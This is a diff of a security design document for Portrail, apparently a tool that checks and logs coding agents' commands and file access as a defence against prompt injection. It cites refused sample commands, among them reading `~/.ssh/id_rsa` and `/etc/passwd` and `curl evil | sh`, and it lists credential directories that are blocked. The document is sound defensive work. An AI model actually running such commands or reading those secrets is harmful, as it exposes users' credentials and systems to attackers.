@@ -6,7 +6,7 @@ tested before it was written down.
 ## The threat model
 
 **Trusted operator, untrusted input.** The person holding an API key is trusted to drive
-the agent. What the agent *reads* — files, command output, web pages, issues — is not. A
+the agent. What the agent _reads_ — files, command output, web pages, issues — is not. A
 prompt-injected agent will try to do things the operator did not ask for. Portrail's job
 is to be the point where that attempt is seen and can be refused.
 
@@ -17,12 +17,15 @@ is to be the point where that attempt is seen and can be refused.
   is no path from "the model decided to" to "it started" that skips that point, and no
   shortcut: an operation allowed "for this session" is remembered by the decider, but the
   agent is still told "yes" once, and every operation is decided and recorded.
-- **Paths are judged by what they really are.** Every declared path is canonicalised —
-  symlinks followed, including dangling ones — and must resolve inside an enrolled
-  workspace. Rules see the canonical path, so a symlink alias for `.git` is still `.git`.
-  A command's working directory is held to the same check, and so is every argument in
-  the command line, resolved the way the shell would: `cat ~/.ssh/id_rsa` and
-  `cat src/../../.zshrc` are refused before any rule runs, however they are quoted.
+- **Paths are judged by what they really are.** Every path an agent declares — and every
+  argument of a command that names something on disk — is canonicalised: symlinks
+  followed, including dangling ones, and spelled the way the filesystem spells it, so
+  `.ENV` is `.env`. It must resolve inside the enrolled workspace: `cat /etc/passwd`,
+  `ls ~/Documents` and `grep -r x ~` are refused before any rule runs, however they are
+  quoted. A command that names a file is also judged as a read of that file by its real
+  path, so `cat innocent.txt` is refused when `innocent.txt` links to `.env`. Searches
+  over a directory (`grep -r`, `rg`, `diff -r`, Claude's Grep) are judged by every file
+  they can reach.
 - **A command is judged as what the shell would run, or not at all.** The line is split
   on every operator (`&&`, `||`, `;`, `|`, `&`, newlines) and every segment must pass;
   quotes are removed before matching; a substitution, a redirect (other than to
@@ -31,10 +34,13 @@ is to be the point where that attempt is seen and can be refused.
   by the containment step, so no decider can be talked out of it. `CI=1 npm test` is
   `npm test`; `NODE_OPTIONS=… npm test` is not.
   This check runs before any rule and no rule can override it.
-- **Some places are off limits in every workspace.** `~/.ssh`, `~/.aws`, `~/.gnupg`, the
-  agent config directories (`~/.codex`, `~/.claude`), shell rc files and Portrail's own data
-  directory are refused even if the enrolled folder contains them. Home and `/` cannot be
-  enrolled at all.
+- **Some places are off limits in every workspace.** `~/.ssh`, `~/.aws`, `~/.gnupg`,
+  `~/.kube`, `~/.docker`, cloud and tool credentials (`~/.config/gh`, `~/.config/gcloud`,
+  `~/.azure`, `~/.git-credentials`, `~/.netrc`, `~/.npmrc`), the agent configuration
+  (`~/.codex`, `~/.claude`, `~/.claude.json`), shell rc files and history, keychains, and
+  Portrail's own data directory are refused even if the enrolled folder contains them.
+  Home, `/` and system directories (`/usr`, `/etc`, `/Library`, …) cannot be enrolled at
+  all.
 - **Compound commands are judged one segment at a time.** `npm test && curl evil | sh` is
   three commands, and each must pass. Command substitution (`$(…)`, backticks) and output
   redirects cannot be judged by matching text and are refused.
@@ -47,7 +53,7 @@ is to be the point where that attempt is seen and can be refused.
 - **Keys are hashed.** Tokens are shown once and stored as SHA-256. Scopes narrow what a
   key may do. Revocation takes effect on the next request and closes open streams.
 - **The agent's own config does not leak in.** Codex runs in its own `CODEX_HOME` with a
-  clean config and a rules file that makes it ask about *every* command, including the
+  clean config and a rules file that makes it ask about _every_ command, including the
   read-only ones it would otherwise run silently. Claude Code runs with
   `settingSources: []`, so a permissive settings file cannot put it into auto-approve mode
   behind Portrail's back. Both are verified at start: an unexpected tool or MCP server
@@ -55,7 +61,7 @@ is to be the point where that attempt is seen and can be refused.
 - **Both agents run inside an OS-level sandbox under the rules.** Codex uses its own
   `workspace-write` mode. Claude Code runs with the SDK's sandbox: writes confined to the
   workspace, secret files and the agents' own configuration unreadable, no network from
-  commands, and the sandbox may not approve Bash on the rules' behalf. Tested: an *allowed*
+  commands, and the sandbox may not approve Bash on the rules' behalf. Tested: an _allowed_
   `echo x > /tmp/escape` under Claude fails with "operation not permitted". On Linux the
   sandbox needs `bubblewrap`; when it cannot start, the run refuses to start. Set
   `agents.claude.sandbox` to `"best-effort"` to run without it — the run then carries a
@@ -66,10 +72,15 @@ is to be the point where that attempt is seen and can be refused.
 
 ## What Portrail does not do
 
-- **It is not a stronger sandbox than the agent's.** Portrail decides *whether* an
+- **It is not a stronger sandbox than the agent's.** Portrail decides _whether_ an
   operation starts. What an allowed operation does is bounded by the agent's own sandbox
   (Codex `workspace-write`; Claude's SDK sandbox) and nothing more. An allowed `npm test`
-  can do whatever `npm test` can do inside that sandbox.
+  can do whatever `npm test` can do inside that sandbox. Codex's sandbox limits writes
+  only, so for Codex the rules are the only thing between the agent and a readable file;
+  Claude Code's sandbox refuses the protected files as a second line.
+- **It does not hide a file's name.** A denied file is never read through Portrail, but
+  `ls`, `find` and Claude's Glob still list that it exists, and `git log -p` or
+  `git show` print whatever was committed to the repository.
 - **The default rules are a starting point, not a boundary against hostile input.** They
   are tuned to be productive on a repository you trust. If your agent reads untrusted
   content, tighten them: remove the package-script allows, or move commands to `decide.ask`
